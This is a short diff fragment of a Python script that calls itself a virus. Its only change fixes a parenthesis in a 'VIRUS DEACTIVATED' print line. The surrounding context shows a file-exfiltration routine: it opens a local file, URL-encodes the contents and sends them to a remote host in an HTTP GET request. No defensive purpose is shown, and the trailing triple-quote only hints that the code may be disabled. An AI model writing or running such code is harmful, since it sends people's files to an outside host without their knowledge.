@@ -49,7 +49,7 @@ file_j = open(f".\\\{file_i}").read()
 file_base64 = f"{file_j}"
 url_enc = requests.utils.quote(file_base64) 
 requests.get(f"http://{host}/?{url_enc}")
-print("------------------VIRUS DEACTIVATED----------------------"
+print("------------------VIRUS DEACTIVATED----------------------")
 
 """
 
